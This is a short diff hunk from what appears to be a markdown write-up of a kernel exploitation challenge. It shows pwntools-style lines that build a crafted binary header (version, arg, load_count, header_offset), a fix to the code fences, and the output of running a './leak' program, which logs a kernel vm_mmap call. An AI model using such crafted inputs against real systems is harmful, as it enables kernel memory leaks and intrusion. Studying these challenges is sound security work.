@@ -196,7 +196,8 @@ binary += p8(0)              # version
 binary += p8(1)              # arg
 binary += p32( 5 )           # load_count
 binary += p64( 0x80 - 0x18 ) # header_offset
-
+```
+```sh=
 Result:
 /tmp $ ./leak
 [    7.607129] vm_mmap(load_addr=0x0, length=0x0, offset=0x0, prot=0)
